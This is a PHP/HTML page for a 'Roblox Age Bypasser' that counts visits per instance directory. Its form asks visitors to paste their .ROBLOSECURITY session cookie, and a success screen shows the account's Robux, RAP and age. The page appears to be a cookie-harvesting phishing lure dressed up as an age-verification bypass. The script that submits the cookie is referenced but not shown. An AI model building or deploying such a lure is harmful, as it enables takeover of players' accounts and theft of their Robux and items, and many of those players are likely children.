<?php
/**
 * Bypasserv3 - Public Bypass Page
 * Tracks visits with file-based storage
 */

require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../functions.php';

// Get directory from URL
$directory = $_GET['dir'] ?? '';

// Track visit if directory exists
if (!empty($directory)) {
    $instanceData = getInstanceData($directory);
    if ($instanceData) {
        $currentVisits = $instanceData['stats']['totalVisits'];
        updateInstanceStats($directory, 'totalVisits', $currentVisits + 1);
        updateDailyStats($directory, 'visits', 1);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Age Bypasser</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #1a1d29 0%, #0f1419 100%);
            color: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        #particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            position: relative;
            z-index: 1;
        }
        
        .glass-box {
            background: rgba(31, 41, 55, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .header {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .header h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 12px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-family: 'Space Grotesk', sans-serif;
        }
        
        .header p {
            color: #9ca3af;
            font-size: 15px;
        }
        
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.2);
            color: #10b981;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
            margin-top: 12px;
        }
        
        .pulse-dot {
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #f3f4f6;
            margin-bottom: 10px;
        }
        
        .cookie-input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            color: #f3f4f6;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            transition: all 0.3s ease;
            min-height: 120px;
            resize: vertical;
        }
        
        .cookie-input::placeholder {
            color: #6b7280;
        }
        
        .cookie-input:focus {
            outline: none;
            background: rgba(0, 0, 0, 0.5);
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .btn-group {
            display: flex;
            gap: 12px;
            margin-bottom: 12px;
        }
        
        .btn {
            flex: 1;
            padding: 14px 20px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
        }
        
        .btn-secondary {
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            color: #3b82f6;
        }
        
        .btn-secondary:hover {
            background: rgba(59, 130, 246, 0.2);
            border-color: rgba(59, 130, 246, 0.4);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Progress State */
        .progress-container {
            text-align: center;
        }
        
        .progress-ring {
            width: 120px;
            height: 120px;
            margin: 0 auto 24px;
            position: relative;
        }
        
        .progress-ring svg {
            transform: rotate(-90deg);
        }
        
        .progress-ring-circle {
            transition: stroke-dashoffset 0.3s ease;
        }
        
        .progress-text {
            font-size: 18px;
            font-weight: 600;
            color: #f3f4f6;
            margin-bottom: 8px;
        }
        
        .progress-subtext {
            font-size: 14px;
            color: #9ca3af;
        }
        
        /* Success State */
        .success-container {
            text-align: center;
        }
        
        .success-checkmark {
            width: 100px;
            height: 100px;
            margin: 0 auto 24px;
            background: rgba(16, 185, 129, 0.2);
            border: 3px solid #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 56px;
            animation: scaleIn 0.5s ease-out;
        }
        
        @keyframes scaleIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .success-title {
            font-size: 28px;
            font-weight: 700;
            color: #10b981;
            margin-bottom: 16px;
        }
        
        .success-message {
            font-size: 15px;
            color: #9ca3af;
            margin-bottom: 24px;
        }
        
        .account-info {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.1);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 24px;
        }
        
        .account-header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 20px;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .account-avatar {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            border: 2px solid rgba(59, 130, 246, 0.3);
        }
        
        .account-name {
            flex: 1;
        }
        
        .account-username {
            font-size: 18px;
            font-weight: 700;
            color: #f3f4f6;
            margin-bottom: 4px;
        }
        
        .account-id {
            font-size: 13px;
            color: #9ca3af;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .info-item {
            background: rgba(0, 0, 0, 0.3);
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .info-label {
            font-size: 11px;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
        }
        
        .info-value {
            font-size: 16px;
            font-weight: 600;
            color: #f3f4f6;
        }
        
        .hidden {
            display: none !important;
        }
        
        /* Failed State */
        .failed-container {
            text-align: center;
        }
        
        .failed-icon {
            width: 100px;
            height: 100px;
            margin: 0 auto 24px;
            background: rgba(239, 68, 68, 0.2);
            border: 3px solid #ef4444;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 56px;
        }
        
        .failed-title {
            font-size: 28px;
            font-weight: 700;
            color: #ef4444;
            margin-bottom: 16px;
        }
        
        .failed-message {
            font-size: 15px;
            color: #9ca3af;
            margin-bottom: 24px;
        }
    </style>
</head>
<body>
    <canvas id="particles"></canvas>
    
    <div class="container">
        <!-- Form State -->
        <div id="form-state" class="glass-box">
            <div class="header">
                <h1>Roblox Age Bypasser</h1>
                <p>Secure and efficient age verification bypass</p>
                <div class="status-badge">
                    <span class="pulse-dot"></span>
                    <span id="live-status">Loading...</span>
                </div>
            </div>
            
            <form id="bypass-form" onsubmit="return handleBypass(event)">
                <div class="form-group">
                    <label>🔑 Roblox Cookie (.ROBLOSECURITY)</label>
                    <textarea 
                        id="cookie-input" 
                        class="cookie-input" 
                        placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."
                        required
                    ></textarea>
                </div>
                
                <div class="btn-group">
                    <button type="button" id="btn-check" class="btn btn-secondary">
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <polyline points="20 6 9 17 4 12"></polyline>
                        </svg>
                        Check Cookie
                    </button>
                    <button type="submit" id="btn-start" class="btn btn-primary">
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10"></circle>
                            <polyline points="12 6 12 12 16 14"></polyline>
                        </svg>
                        Start Bypass
                    </button>
                </div>
            </form>
        </div>
        
        <!-- Processing State -->
        <div id="processing-state" class="glass-box hidden">
            <div class="progress-container">
                <div class="progress-ring">
                    <svg width="120" height="120">
                        <circle cx="60" cy="60" r="54" stroke="rgba(59, 130, 246, 0.2)" stroke-width="8" fill="none" />
                        <circle id="progress-bar" class="progress-ring-circle" cx="60" cy="60" r="54" stroke="#3b82f6" stroke-width="8" fill="none" 
                                stroke-dasharray="339.292" stroke-dashoffset="339.292" stroke-linecap="round" />
                    </svg>
                </div>
                <div class="progress-text" id="progress-text">Connecting to API...</div>
                <div class="progress-subtext">Please wait...</div>
            </div>
        </div>
        
        <!-- Success State -->
        <div id="success-state" class="glass-box hidden">
            <div class="success-container">
                <div class="success-checkmark">✓</div>
                <h2 class="success-title">Success!</h2>
                <p class="success-message">⏱ Wait 1-2 minutes, then check your Roblox account settings to verify the changes!</p>
                
                <div class="account-info">
                    <div class="account-header">
                        <img id="user-avatar" src="https://www.roblox.com/headshot-thumbnail/image/default.png" alt="Avatar" class="account-avatar">
                        <div class="account-name">
                            <div class="account-username" id="user-display-name">@Username</div>
                            <div class="account-id">User ID: <span id="info-userid">0</span></div>
                        </div>
                    </div>
                    
                    <div class="info-grid">
                        <div class="info-item">
                            <div class="info-label">Username</div>
                            <div class="info-value" id="info-username">Unknown</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Robux</div>
                            <div class="info-value" id="info-robux">0</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">RAP</div>
                            <div class="info-value" id="info-rap">0</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Account Age</div>
                            <div class="info-value" id="info-age">Unknown</div>
                        </div>
                    </div>
                </div>
                
                <button type="button" id="btn-restart" class="btn btn-primary" style="width: 100%;">
                    🔄 Bypass Another
                </button>
            </div>
        </div>
        
        <!-- Failed State -->
        <div id="failed-state" class="glass-box hidden">
            <div class="failed-container">
                <div class="failed-icon">✗</div>
                <h2 class="failed-title">Bypass Failed</h2>
                <p class="failed-message">Failed to send request. Make sure your cookie is already refreshed or your account is not -13 / age verified.</p>
                
                <button type="button" id="btn-retry" class="btn btn-primary" style="width: 100%;">
                    🔄 Try Again
                </button>
            </div>
        </div>
    </div>
    
    <script src="/public/script.js"></script>
</body>
</html>
